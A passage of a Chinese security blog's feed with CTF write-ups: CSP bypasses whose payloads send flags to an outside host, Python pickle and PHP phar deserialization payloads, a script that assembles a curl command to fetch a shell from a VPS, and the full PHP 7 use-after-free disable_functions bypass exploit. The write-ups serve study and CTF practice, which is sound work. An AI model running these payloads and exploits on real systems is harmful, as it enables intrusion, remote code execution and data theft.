id="iframe绕过"><a href="#iframe绕过" class="headerlink" title="iframe绕过"></a>iframe绕过</h3><blockquote><p>当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效</p></blockquote><h3 id="jsonp绕过"><a href="#jsonp绕过" class="headerlink" title="jsonp绕过"></a>jsonp绕过</h3><p><a href="https://github.com/google/csp-evaluator/tree/master/whitelist_bypasses" target="_blank" rel="noopener">收集</a></p><h2 id="CSP绕过实例"><a href="#CSP绕过实例" class="headerlink" title="CSP绕过实例"></a>CSP绕过实例</h2><h3 id="BSidesSF-2020-csp-1"><a href="#BSidesSF-2020-csp-1" class="headerlink" title="BSidesSF 2020 csp-1"></a>BSidesSF 2020 csp-1</h3><p>csp如下，<code>script-src</code> 支持 data</p><pre><code class="j">content-security-policy:     script-src &#39;self&#39; data:;     default-src &#39;self&#39;;     connect-src *;     report-uri /csp_report</code></pre><p>可以使用 <code>fetch</code> (js实在是不熟悉)</p><p>payload-1</p><pre><code>&lt;script src=&quot;data:,fetch(&#39;/csp-one-flag&#39;).then(x=&gt;x.text()).then(x=&gt;location=&#39;http://rwx.kr/?&#39;+escape(x))&quot;&gt;</code></pre><p>或者编码也是可以的</p><pre><code>// NOTE:// &quot;ZmV0Y...&quot; is base64 encoded text of this script.// fetch(&quot;https://csp-1-5aa1f221.challenges.bsidessf.net/csp-one-flag&quot;).then(r=&gt;r.text()).then(t=&gt;fetch(&quot;YOUR_SERVER&quot;+t))&lt;script src=&quot;data:text/javascript;base64,ZmV0Y2goImh0dHBzOi8vY3NwLTEtNWFhMWYyMjEuY2hhbGxlbmdlcy5ic2lkZXNzZi5uZXQvY3NwLW9uZS1mbGFnIikudGhlbihyPT5yLnRleHQoKSkudGhlbih0PT5mZXRjaCgiWU9VUl9TRVJWRVIiK3QpKQ==&quot;&gt;&lt;/script&gt;</code></pre><h3 id="csp-2"><a href="#csp-2" class="headerlink" title="csp-2"></a>csp-2</h3><pre><code>Content-Security-Policy: script-src &#39;self&#39; ajax.googleapis.com &#39;unsafe-eval&#39;; default-src &#39;self&#39; &#39;unsafe-inline&#39;; connect-src *; report-uri /csp_report</code></pre><p>看到了 <code>ajax.googleapis.com</code> 在白名单中，可以使用其提供的angularjs的模板注入来绕过</p><pre><code class="html">&lt;script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js&gt;&lt;/script&gt;&lt;div ng-app ng-csp&gt;{{constructor.constructor('eval(atob("ZmV0Y2goIi9jc3AtdHdvLWZsYWciKS50aGVuKHg9PngudGV4dCgpKS50aGVuKHg9PmxvY2F0aW9uPSIvL3J3eC5rci8/Iitlc2NhcGUoeCkp"))')()}}&lt;/div&gt;</code></pre><p>payload2</p><pre><code class="js">&lt;script src=&quot;//ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js&quot;&gt;&lt;/script&gt; &lt;div class=&quot;ng-app&quot;&gt; {{ constructor.constructor('fetch("https://csp-2-2446d5a3.challenges.bsidessf.net/csp-two-flag").then(r=>r.text()).then(t=>fetch("YOUR_SERVER"+t))')() }} &lt;/div&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基本概念&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;code&gt;default-src&lt;/code&gt;&lt;/th&gt;
&lt;th&gt;&lt;code&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="CSP" scheme="http://prontosil.com/tags/CSP/"/>
    
  </entry>
  
  <entry>
    <title>python字符串的一些小坑</title>
    <link href="http://prontosil.com/posts/e247dc77/"/>
    <id>http://prontosil.com/posts/e247dc77/</id>
    <published>2020-03-10T06:03:41.000Z</published>
    <updated>2020-03-10T07:16:09.094Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>pickle反序列化</title>
    <link href="http://prontosil.com/posts/2d71dd35/"/>
    <id>http://prontosil.com/posts/2d71dd35/</id>
    <published>2020-03-10T05:42:08.000Z</published>
    <updated>2020-03-10T07:16:09.091Z</updated>
    
    <content type="html"><![CDATA[<p>就分析几道例题吧</p><h2 id="CISCN-2019-ikun"><a href="#CISCN-2019-ikun" class="headerlink" title="CISCN 2019 ikun"></a>CISCN 2019 ikun</h2><p>这题开始脑洞比较大</p><p><img src="/posts/2d71dd35/1583819034564.png" alt></p><p>然后观察URL</p><pre><code>http://b8869902-7911-4d16-bb0c-fe61550e2cea.node3.buuoj.cn/shop?page=1</code></pre><p>开始以为这里有注入，因为加一个单引号网站就崩了</p><p>但是不然。是需要找到 <code>lv6</code></p><pre><code class="python">import requestsURL = &quot;http://b8869902-7911-4d16-bb0c-fe61550e2cea.node3.buuoj.cn/shop?page=&quot;for i in range(2000):    res = requests.get(URL+str(i))    if b&quot;lv6.png&quot; in res.content:        print(i)        break</code></pre><p>注意 <code>res.content</code> 返回的是byte类型， <code>res.text</code> 会自动转码为字符串</p><p>得到的结果是181</p><p><img src="/posts/2d71dd35/1583819267198.png" alt></p><p>当然按照管理你是买不起的</p><p>抓个包改一下折扣</p><p><img src="/posts/2d71dd35/1583819306763.png" alt></p><p>进入后台 </p><pre><code>http://b8869902-7911-4d16-bb0c-fe61550e2cea.node3.buuoj.cn/b1g_m4mber</code></pre><p><img src="/posts/2d71dd35/1583819326133.png" alt></p><p>注意到是用jwt认证的，爆破一下</p><p><img src="/posts/2d71dd35/1583819359124.png" alt></p><p>然后伪造一下进入admin，查看页面源代码有代码下载地址</p><p>审计代码</p><p>看到 <code>Admin.py</code></p><pre><code class="python">import tornado.webfrom sshop.base import BaseHandlerimport pickleimport urllibclass AdminHandler(BaseHandler):    @tornado.web.authenticated    def get(self, *args, **kwargs):        if self.current_user == &quot;admin&quot;:            return self.render(&#39;form.html&#39;, res=&#39;This is Black Technology!&#39;, member=0)        else:            return self.render(&#39;no_ass.html&#39;)    @tornado.web.authenticated    def post(self, *args, **kwargs):        try:            become = self.get_argument(&#39;become&#39;)            p = pickle.loads(urllib.unquote(become))            return self.render(&#39;form.html&#39;, res=p, member=1)        except:            return self.render(&#39;form.html&#39;, res=&#39;This is Black Technology!&#39;, member=0)</code></pre><p>会反序列化传过来的 become 参数，于是</p><pre><code class="python">import pickleimport urllibclass payload(object):    def __reduce__(self):       return (eval, (&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a)print a</code></pre><p>生成</p><pre><code>c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</code></pre><p>提交即可</p><p><img src="/posts/2d71dd35/1583819516737.png" alt></p><h2 id="抗疫分享赛webtmp"><a href="#抗疫分享赛webtmp" class="headerlink" title="抗疫分享赛webtmp"></a>抗疫分享赛webtmp</h2><p>这题涉及到了如何手动构造 pickle 数据</p><p>复习一下指令</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;就分析几道例题吧&lt;/p&gt;
&lt;h2 id=&quot;CISCN-2019-ikun&quot;&gt;&lt;a href=&quot;#CISCN-2019-ikun&quot; class=&quot;headerlink&quot; title=&quot;CISCN 2019 ikun&quot;&gt;&lt;/a&gt;CISCN 2019 ikun&lt;/h2&gt;&lt;p&gt;这题
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="反序列化" scheme="http://prontosil.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="pickle" scheme="http://prontosil.com/tags/pickle/"/>
    
  </entry>
  
  <entry>
    <title>常用的网站</title>
    <link href="http://prontosil.com/posts/f364e7d6/"/>
    <id>http://prontosil.com/posts/f364e7d6/</id>
    <published>2020-03-10T05:30:08.000Z</published>
    <updated>2020-03-10T05:38:05.501Z</updated>
    
    <content type="html"><![CDATA[<h2 id="大师傅"><a href="#大师傅" class="headerlink" title="大师傅"></a>大师傅</h2><p><a href="http://szfszf.top/" target="_blank" rel="noopener">http://szfszf.top/</a></p><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;大师傅&quot;&gt;&lt;a href=&quot;#大师傅&quot; class=&quot;headerlink&quot; title=&quot;大师傅&quot;&gt;&lt;/a&gt;大师傅&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://szfszf.top/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http:/
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="网站" scheme="http://prontosil.com/tags/%E7%BD%91%E7%AB%99/"/>
    
  </entry>
  
  <entry>
    <title>tornado框架</title>
    <link href="http://prontosil.com/posts/11fc1d3/"/>
    <id>http://prontosil.com/posts/11fc1d3/</id>
    <published>2020-03-10T05:26:44.000Z</published>
    <updated>2020-03-10T05:34:21.459Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>jwt学习笔记</title>
    <link href="http://prontosil.com/posts/70fc8f0c/"/>
    <id>http://prontosil.com/posts/70fc8f0c/</id>
    <published>2020-03-10T05:24:10.000Z</published>
    <updated>2020-03-10T05:42:37.027Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>requests文档阅读笔记</title>
    <link href="http://prontosil.com/posts/bce54486/"/>
    <id>http://prontosil.com/posts/bce54486/</id>
    <published>2020-03-10T05:20:52.000Z</published>
    <updated>2020-03-10T06:08:19.061Z</updated>
    
    <content type="html"><![CDATA[<h2 id="如何发送post请求"><a href="#如何发送post请求" class="headerlink" title="如何发送post请求"></a>如何发送post请求</h2><pre><code> r = requests.post(&#39;http://httpbin.org/post&#39;, data = {&#39;key&#39;:&#39;value&#39;})</code></pre><p>其他的请求也类似</p><pre><code>&gt;&gt;&gt; r = requests.put(&#39;http://httpbin.org/put&#39;, data = {&#39;key&#39;:&#39;value&#39;})&gt;&gt;&gt; r = requests.delete(&#39;http://httpbin.org/delete&#39;)&gt;&gt;&gt; r = requests.head(&#39;http://httpbin.org/get&#39;)&gt;&gt;&gt; r = requests.options(&#39;http://httpbin.org/get&#39;)</code></pre><h2 id="GET请求如何传递URL参数"><a href="#GET请求如何传递URL参数" class="headerlink" title="GET请求如何传递URL参数"></a>GET请求如何传递URL参数</h2><pre><code>In [12]: r = requests.get(url,params={&quot;key1&quot;:&quot;1&quot;, &quot;key2&quot;:&quot;2&quot;})In [13]: r.urlOut[13]: &#39;http://httpbin.org/get?key2=2&amp;key1=1&#39;</code></pre><p>但是怎么传递数组呢？这是个问题</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;如何发送post请求&quot;&gt;&lt;a href=&quot;#如何发送post请求&quot; class=&quot;headerlink&quot; title=&quot;如何发送post请求&quot;&gt;&lt;/a&gt;如何发送post请求&lt;/h2&gt;&lt;pre&gt;&lt;code&gt; r = requests.post(&amp;#39;http:/
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="文档" scheme="http://prontosil.com/tags/%E6%96%87%E6%A1%A3/"/>
    
  </entry>
  
  <entry>
    <title>战疫分享赛wp</title>
    <link href="http://prontosil.com/posts/2f3193b1/"/>
    <id>http://prontosil.com/posts/2f3193b1/</id>
    <published>2020-03-10T01:15:07.000Z</published>
    <updated>2020-03-10T06:35:57.975Z</updated>
    
    <content type="html"><![CDATA[<h2 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h2><p><a href="http://www.zip源码，审计之后看到两个很有意思的操作" target="_blank" rel="noopener">www.zip源码，审计之后看到两个很有意思的操作</a></p><p>根目录下的 <code>init.php</code>文件中</p><pre><code class="php">&lt;?php//初始化整个页面error_reporting(0);//lib.php包括一些常见的函数include &#39;lib.php&#39;;session_save_path(&#39;session&#39;);ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);session_start();</code></pre><p>但是在 <code>core</code> 目录下的 <code>init.php</code> 中</p><pre><code class="php">&lt;?php//初始化整个页面#error_reporting(0);//lib.php包括一些常见的函数include &#39;../lib.php&#39;;session_save_path(&#39;../session&#39;);ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();</code></pre><p>用了两种不同的session处理方式</p><p>所以提交一个签名为</p><pre><code>|O:4:&quot;info&quot;:1:{s:5:&quot;admin&quot;;i:1;}</code></pre><p>这样再访问 <code>profile.php</code> 的时候</p><pre><code class="php">&lt;?phperror_reporting(0);session_save_path(&#39;session&#39;);include &#39;lib.php&#39;;ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();class info{    public $admin;    public $sign;    public function __construct()    {        $this-&gt;admin = $_SESSION[&#39;admin&#39;];        $this-&gt;sign = $_SESSION[&#39;sign&#39;];    }    public function __destruct()    {        echo $this-&gt;sign;        if ($this-&gt;admin === 1) {            redirect(&#39;./core/index.php&#39;);        }    }}$a = new info();?&gt;</code></pre><p>就会触发反序列化，然后进入 <code>core/index.php</code> 中</p><p><code>core/index.php</code> 的源代码</p><pre><code>&lt;?phprequire_once(&#39;./init.php&#39;);error_reporting(0);if (check_session($_SESSION)) {    #hint : core/clear.php    $sandbox = &#39;./sandbox/&#39; . md5(&quot;Mrk@1xI^&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);    echo $sandbox;    @mkdir($sandbox);    @chdir($sandbox);    if (isset($_POST[&#39;url&#39;])) {        $url = $_POST[&#39;url&#39;];        if (filter_var($url, FILTER_VALIDATE_URL)) {            if (preg_match(&#39;/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i&#39;, $url)) {                echo &quot;you are hacker&quot;;            } else {                $res = parse_url($url);                if (preg_match(&#39;/127\.0\.0\.1$/&#39;, $res[&#39;host&#39;])) {                    $code = file_get_contents($url);                    if (strlen($code) &lt;= 4) {                        @exec($code);                    } else {                        echo &quot;try again&quot;;                    }                }            }        } else {            echo &quot;invalid url&quot;;        }    } else {        highlight_file(__FILE__);    }} else {    die(&#39;只有管理员才能看到我哟&#39;);}</code></pre><p>不准用 <code>data</code> 协议，并且解析到的host必须是 <code>127.0.0.1</code> 初看还挺像2019年的byteCTF，但是这里用到的是 <code>compress.zlib</code> 协议(学习了)</p><pre><code>compress.zlib://data:@127.0.0.1/baidu.com?,ls</code></pre><p>当然也可以用base64的方式</p><pre><code>compress.zlib://data:@127.0.0.1/plain;base64,</code></pre><p>之后需要绕过长度来执行命令，脚本就用队友的好了，不能弹shell，只能从vps上下载shell到靶机上</p><pre><code class="python">import requestsfrom time import sleepfrom urllib import parsefrom requests import sessionimport base64import randoms = session()url = &quot;http://121.36.222.22:88/login.php&quot;s.post(url, data={&#39;name&#39;:&#39;pxypxy&#39;})url1 = &quot;http://121.36.222.22:88/?page=upload&quot;s.post(url1, data={&#39;sign&#39;:&#39;woc|O:4:&quot;info&quot;:2:{s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:4:&quot;ssss&quot;;}&#39;})url3 = &quot;http://121.36.222.22:88/core/index.php&quot;s.get(url3)ip = &#39;x.x.x.x&#39;ip = &#39;0x&#39; + &#39;&#39;.join([str(hex(int(i))[2:].zfill(2))for i in ip.split(&#39;.&#39;)])pos0 = &#39;y&#39;pos1 = &#39;d&#39;pos2 = &#39;s&#39;payload = [    &#39;&gt;dir&#39;,    &#39;&gt;%s\&gt;&#39; % pos0,    &#39;&gt;%st-&#39; % pos1,    &#39;&gt;sl&#39;,    &#39;*&gt;v&#39;,    &#39;&gt;rev&#39;,    &#39;*v&gt;%s&#39; % pos2,    &#39;&gt;p&#39;,    &#39;&gt;ph\\&#39;,    &#39;&gt;y.\\&#39;,    &#39;&gt;\&gt;\\&#39;,    &#39;&gt;%s\\&#39; % ip[8:10],    &#39;&gt;%s\\&#39; % ip[6:8],    &#39;&gt;%s\\&#39; % ip[4:6],    &#39;&gt;%s\\&#39; % ip[2:4],    &#39;&gt;%s\\&#39; % ip[0:2],    &#39;&gt;\ \\&#39;,    &#39;&gt;rl\\&#39;,    &#39;&gt;cu\\&#39;,    &#39;sh &#39; + pos2,    &#39;sh &#39; + pos0,]for i in payload:    data = {&#39;url&#39;:&#39;compress.zlib://data:@127.0.0.1/plain;base64,&#39;+base64.b64encode(i.encode()).decode()}    r = s.post(url3, data=data)    print(r.text)    print(data[&#39;url&#39;])    sleep(0.1)</code></pre><h2 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h2><p>分析</p><p>考点是pickle反序列化，过滤掉了  R 指令码，并且重写了 <code>find_class</code>：</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module == &#39;__main__&#39;:            return getattr(sys.modules[&#39;__main__&#39;], name)        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))</code></pre><p>这就禁止引用除了 <code>__main__</code> 之外的其他module，但是如果通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改</p><p>于是可以先引入 <code>__main__.secret</code> 这个module，然后把一个 dict 压入栈，内容是 <code>{&#39;name&#39;: &#39;xx&#39;, &#39;category&#39;: &#39;yyy&#39;}</code>,之后执行 build指令，改写 <code>__main__.secret.name</code> 和 <code>__main__.secret.category</code>,此时 <code>secret.name</code>和 <code>secret.category</code> 已经变成我们想要的内容</p><p>之后再压入一个正常的 Animal对象，name和category分别是 xx和yyy最后构造的pickle数据如下</p><pre><code>b&quot;\x80\x03c__main__\nsecret\n}(Vname\nVxx\nVcategory\nVyyy\nub0c__main__\nAnimal\n)\x81}(S&#39;name&#39;\nS&#39;xx&#39;\nS&#39;category&#39;\nS&#39;yyy&#39;\nub.&quot;</code></pre><p>编码为base64提交即可</p><pre><code>gANjX19tYWluX18Kc2VjcmV0Cn0oVm5hbWUKVnh4ClZjYXRlZ29yeQpWeXl5CnViMGNfX21haW5fXwpBbmltYWwKKYF9KFMnbmFtZScKUyd4eCcKUydjYXRlZ29yeScKUyd5eXknCnViLg==</code></pre><h2 id="php-uaf"><a href="#php-uaf" class="headerlink" title="php-uaf"></a>php-uaf</h2><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php" target="_blank" rel="noopener">脚本</a></p><pre><code class="php">rddshell&lt;?php# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=76047# debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability.## This exploit should work on all PHP 7.0-7.4 versions# released as of 30/01/2020.## Author: https://github.com/mm0r1pwn(&#39;/readflag&#39;);function pwn($cmd) {    global $abc, $helper, $backtrace;    class Vuln {        public $a;        public function __destruct() {             global $backtrace;             unset($this-&gt;a);            $backtrace = (new Exception)-&gt;getTrace(); # ;)            if(!isset($backtrace[1][&#39;args&#39;])) { # PHP &gt;= 7.4                $backtrace = debug_backtrace();            }        }    }    class Helper {        public $a, $b, $c, $d;    }    function str2ptr(&amp;$str, $p = 0, $s = 8) {        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) {            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        }        return $address;    }    function ptr2str($ptr, $m = 8) {        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) {            $out .= chr($ptr &amp; 0xff);            $ptr &gt;&gt;= 8;        }        return $out;    }    function write(&amp;$str, $p, $v, $n = 8) {        $i = 0;        for($i = 0; $i &lt; $n; $i++) {            $str[$p + $i] = chr($v &amp; 0xff);            $v &gt;&gt;= 8;        }    }    function leak($addr, $p = 0, $s = 8) {        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }        return $leak;    }    function parse_elf($base) {        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) {            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write                # handle pie                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec                $text_size = $p_memsz;            }        }        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    }    function get_basic_funcs($base, $elf) {        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) {            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {                $deref = leak($leak);                # &#39;constant&#39; constant check                if($deref != 0x746e6174736e6f63)                    continue;            } else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {                $deref = leak($leak);                # &#39;bin2hex&#39; constant check                if($deref != 0x786568326e6962)                    continue;            } else continue;            return $data_addr + $i * 8;        }    }    function get_binary_base($binary_leak) {        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) {            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) { # ELF header                return $addr;            }        }    }    function get_system($basic_funcs) {        $addr = $basic_funcs;        do {            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) { # system                return leak($addr + 8);            }            $addr += 0x20;        } while($f_entry != 0);        return false;    }    function trigger_uaf($arg) {        # str_shuffle prevents opcache string interning        $arg = str_shuffle(str_repeat(&#39;A&#39;, 79));        $vuln = new Vuln();        $vuln-&gt;a = $arg;    }    if(stristr(PHP_OS, &#39;WIN&#39;)) {        die(&#39;This PoC is for *nix systems only.&#39;);    }    $n_alloc = 10; # increase this value if UAF fails    $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(str_repeat(&#39;A&#39;, 79));    trigger_uaf(&#39;x&#39;);    $abc = $backtrace[1][&#39;args&#39;][0];    $helper = new Helper;    $helper-&gt;b = function ($x) { };    if(strlen($abc) == 79 || strlen($abc) == 0) {        die(&quot;UAF failed&quot;);    }    # leaks    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    # fake value    write($abc, 0x60, 2);    write($abc, 0x70, 6);    # fake reference    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) {        die(&quot;Couldn&#39;t determine binary base address&quot;);    }    if(!($elf = parse_elf($base))) {        die(&quot;Couldn&#39;t parse ELF header&quot;);    }    if(!($basic_funcs = get_basic_funcs($base, $elf))) {        die(&quot;Couldn&#39;t get basic_functions address&quot;);    }    if(!($zif_system = get_system($basic_funcs))) {        die(&quot;Couldn&#39;t get zif_system address&quot;);    }    # fake closure object    $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) {        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    }    # pwn    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4); # internal func type    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler    ($helper-&gt;b)($cmd);    exit();}</code></pre><p>上传到tmp目录就行了</p><p><img src="/posts/2f3193b1/1583803771844.png" alt></p><h2 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h2><p><code>www.zip</code> 源码泄露(现在好多web题都喜欢这么搞了)</p><p>这题主要是对伪造mysql的考察，但是有一个坑点</p><p><img src="/posts/2f3193b1/1583812041964.png" alt></p><p>我们可以设置<code>option</code>为8，然后就启用<code>MYSQL_OPT_LOCAL_INFILE</code>了。</p><p><img src="/posts/2f3193b1/1583812118883.png" alt></p><p>之后构造一个POP链就行了，POP链不是很长</p><pre><code class="php">&lt;?phpclass Listfile{    public $file;    function __construct()    {        $this-&gt;file = &quot;;/readflag&quot;;    }}class Fileupload{    public $file;    function __construct()    {        $this-&gt;file = new Listfile();    }}$payload = new Fileupload();$exp = new Phar(&#39;yds.phar&#39;);$exp -&gt; startBuffering();$exp-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;);$exp -&gt; addFromString(&#39;test.txt&#39;,&#39;test&#39;);$exp -&gt; setMetadata($payload);$exp -&gt; stopBuffering();</code></pre><p><img src="/posts/2f3193b1/0.png" alt></p><h2 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h2><p>这题估计是很多队伍都比较头疼的了，3月7日那天折腾了一下午直到晚上才有师傅做出来</p><p>源代码</p><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;head&#39;])&amp;&amp;isset($_GET[&#39;url&#39;])){    $begin = &quot;The number you want: &quot;;    extract($_GET);    if($head == &#39;&#39;){        die(&#39;Where is your head?&#39;);    }    if(preg_match(&#39;/[A-Za-z0-9]/i&#39;,$head)){        die(&#39;Head can\&#39;t be like this!&#39;);    }    if(preg_match(&#39;/log/i&#39;,$url)){        die(&#39;No No No&#39;);    }    if(preg_match(&#39;/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i&#39;,$url)){        die(&#39;Don\&#39;t use strange protocol!&#39;);    }    $funcname = $head.&#39;curl_init&#39;;    $ch = $funcname();    if($ch){        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        $output = curl_exec($ch);        curl_close($ch);    }    else{        $output = &#39;rua&#39;;    }    echo sprintf($begin.&#39;%d&#39;,$output);}else{    show_source(__FILE__);}</code></pre><p>几个小trick</p><ul><li><code>$head = \</code> 这样拼接之后就是根命名空间</li><li>协议基本都被过滤干净了就只能用http协议</li><li><code>$begin= %s%</code></li><li>过滤了 <code>log</code>，我估计是出题人不想让你去读日志(因为后面发现可以读除了flag之外的任意文件)</li></ul><p>之后就扫内网，看到开放了8080端口</p><p><img src="/posts/2f3193b1/1583812423811.png" alt></p><p>这里的坑点就比较多了，首先需要知道vipcode</p><pre><code>?head=\&amp;url=http://127.0.0.1:8080/read/file={file.vip.__dict__}%26vipcode=0&amp;begin=%s%</code></pre><p><img src="/posts/2f3193b1/1583812448622.png" alt></p><p>然后读文件</p><pre><code>/?head=\&amp;url=http://127.0.0.1:8080/read/file=/app/base/vip.py%26vipcode=m3O5PGEBMnbX0N8ugWlIoijtFaS9KsqVAQdvZyT1cheCxpwf&amp;begin=%s%</code></pre><p><img src="/posts/2f3193b1/1583812465323.png" alt></p><p><code>vip.py</code> </p><pre><code class="python">Welcome,dear vip! Here are what you want:The file you read is:/app/base/vip.pyThe content is:import randomimport stringvipcode = &#39;&#39;class vip:    def __init__(self):        global vipcode        if vipcode == &#39;&#39;:            vipcode = &#39;&#39;.join(random.sample(string.ascii_letters+string.digits, 48))            self.truevipcode = vipcode        else:            self.truevipcode = vipcode    def GetCode(self):        return self.truevipcodeOther files under the same folder:__pycache__ __init__.py vip.py readfile.py%d</code></pre><p><code>readfile.py</code></p><pre><code class="python">from .vip import vipimport reimport osclass File:    def __init__(self,file):        self.file = file    def __str__(self):        return self.file    def GetName(self):        return self.fileclass readfile():    def __str__(self):        filename = self.GetFileName()        if &#39;..&#39; in filename or &#39;proc&#39; in filename:            return &quot;quanbumuda&quot;        else:            try:                file = open(&quot;/tmp/&quot; + filename, &#39;r&#39;)                content = file.read()                file.close()                return content            except:                return &quot;error&quot;    def __init__(self, data):        if re.match(r&#39;file=.*?&amp;vipcode=.*?&#39;,data) != None:            data = data.split(&#39;&amp;&#39;)            data = {                data[0].split(&#39;=&#39;)[0]: data[0].split(&#39;=&#39;)[1],                data[1].split(&#39;=&#39;)[0]: data[1].split(&#39;=&#39;)[1]            }            if &#39;file&#39; in data.keys():                self.file = File(data[&#39;file&#39;])            if &#39;vipcode&#39; in data.keys():                self.vipcode = data[&#39;vipcode&#39;]            self.vip = vip()    def test(self):        if &#39;file&#39; not in dir(self) or &#39;vipcode&#39; not in dir(self) or &#39;vip&#39; not in dir(self):            return False        else:            return True    def isvip(self):        if self.vipcode == self.vip.GetCode():            return True        else:            return False    def GetFileName(self):        return self.file.GetName()current_folder_file = []class vipreadfile():    def __init__(self,readfile):        self.filename = readfile.GetFileName()        self.path = os.path.dirname(os.path.abspath(self.filename))        self.file = File(os.path.basename(os.path.abspath(self.filename)))        global current_folder_file        try:            current_folder_file = os.listdir(self.path)        except:            current_folder_file = current_folder_file    def __str__(self):        if &#39;fl4g&#39; in self.path:            return &#39;nonono,this folder is a secret!!!&#39;        else:            output = &#39;&#39;&#39;Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n&#39;&#39;&#39;            